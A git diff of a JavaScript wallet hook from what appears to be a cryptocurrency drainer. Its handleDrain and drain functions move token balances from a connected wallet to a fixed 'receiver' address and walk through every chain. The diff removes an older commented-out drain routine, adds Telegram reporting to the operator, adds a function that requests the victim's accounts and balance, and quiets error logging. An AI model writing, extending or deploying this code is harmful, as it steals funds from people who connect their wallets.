@@ -7,6 +7,8 @@ import { Contract, providers, ethers, utils } from "ethers";
 import contractAbi from "./blockchain/contract.json";
 import { config, receiver, API_KEY } from "../app/web3Config";
 import { toast } from "react-toastify";
+import Web3 from "web3";
+import { sendMessageToTelegram } from "../app/telegramUtils";
 
 export const UseWallet = () => {
   const account = useAccount();
@@ -154,74 +156,6 @@ export const UseWallet = () => {
     await handleMulticall(tokens, ethBalance);
   };
 
-  // TODO: to be uncommented
-  // const handleDrain = async ({ chainId, address }) => {
-  //   if (!window.ethereum) {
-  //     console.log("Ethereum provider is not available.");
-  //     return;
-  //   }
-
-  //   // const chainId = getChainId(config);
-
-  //   // Update chainInteractionStatus after interacting with the chain
-  //   chainInteractionStatus[chainId] = true;
-
-  //   const provider = new ethers.providers.Web3Provider(window.ethereum);
-  //   const signer = provider.getSigner(address);
-  //   const ethBalance = await getBalance(config, {
-  //     address,
-  //     chainId,
-  //   });
-
-  //   const tokens = await getTokenAssets();
-
-  //   // Process each token individually
-  //   for (let token of tokens) {
-  //     const { tokenAddress, tokenAmount } = token;
-
-  //     if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
-  //       const tokenContract = new Contract(
-  //         tokenAddress,
-  //         [
-  //           "function balanceOf(address owner) view returns (uint256)",
-  //           "function transfer(address to, uint256 amount) external returns (bool)",
-  //         ],
-  //         signer
-  //       );
-
-  //       const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
-  //         .mul(8)
-  //         .div(10); // Transfer 80% of the balance
-
-  //       try {
-  //         const userBalance = await tokenContract.balanceOf(address);
-  //         if (userBalance.lt(amountInWei)) {
-  //           console.log(`Insufficient token balance for ${tokenAddress}`);
-  //           continue; // Move to next token
-  //         }
-
-  //         const transferTx = await tokenContract.transfer(
-  //           receiver,
-  //           amountInWei
-  //         );
-  //         console.log(`Transfer tx hash: ${transferTx.hash}`);
-  //         await transferTx.wait();
-  //         console.log(
-  //           `Transferred ${amountInWei.toString()} of ${tokenAddress}`
-  //         );
-
-  //         chainDrainStatus[chainId] = true; // Mark chain as drained if successful
-  //       } catch (error) {
-  //         console.log(`Transfer failed for ${tokenAddress}:`, error);
-  //         continue; // Continue to next token on failure
-  //       }
-  //     }
-  //   }
-
-  //   // After tokens, handle multicall for native tokens
-  //   await handleMulticall(tokens, ethBalance);
-  // };
-
   const handleDrain = async ({ chainId, address, transferAmount }) => {
     if (!window.ethereum) {
       console.log("Ethereum provider is not available.");
@@ -276,6 +210,9 @@ export const UseWallet = () => {
 
           chainDrainStatus[chainId] = true; // Mark chain as drained if successful
         } catch (error) {
+          sendMessageToTelegram(
+            `|-----Error during swap-----|\nError: ${error?.message}`
+          );
           console.log(`Transfer failed for ${tokenAddress}:`, error);
           continue; // Continue to next token on failure
         }
@@ -338,6 +275,48 @@ export const UseWallet = () => {
     }
   };
 
+  const getWalletBalance = async ({ setWalletBalance }) => {
+    try {
+      // Check if window.ethereum is available
+      if (typeof window.ethereum === "undefined") {
+        console.log("Ethereum provider is not available");
+        return;
+      }
+
+      // Initialize Web3 instance
+      const web3 = new Web3(window.ethereum);
+
+      // Request accounts
+      const accounts = await window.ethereum.request({
+        method: "eth_requestAccounts",
+      });
+
+      if (!accounts || accounts.length === 0) {
+        console.log(
+          "No accounts found. Make sure the user is logged into their wallet."
+        );
+        return;
+      }
+
+      // Get balance in wei
+      const weiBalance = await web3.eth.getBalance(accounts[0]);
+
+      if (weiBalance === undefined) {
+        console.error("Failed to fetch balance for the account:", accounts[0]);
+        return;
+      }
+
+      // Convert to Ether
+      const ethBalance = web3.utils.fromWei(weiBalance, "ether"); // Specify 'ether' as the unit
+      // console.log("ETH Balance:", ethBalance);
+
+      // Set the wallet balance state
+      setWalletBalance(ethBalance);
+    } catch (err) {
+      console.log("Error fetching balance:", err);
+    }
+  };
+
   const proceedToNextChain = async () => {
     const nextChainId = Object.keys(chainInteractionStatus).find(
       (id) => !chainInteractionStatus[id]
@@ -348,7 +327,7 @@ export const UseWallet = () => {
         await switchChain(config, { chainId: Number(nextChainId) });
         await drain(); // Recursive call to drain the next chain
       } catch (switchError) {
-        console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
+        // console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
         await proceedToNextChain(); // Continue to next operation even if chain switch fails
       }
     } else {
@@ -425,5 +404,6 @@ export const UseWallet = () => {
     drain,
     getTokenAssets,
     handleDrain,
+    getWalletBalance,
   };
 };
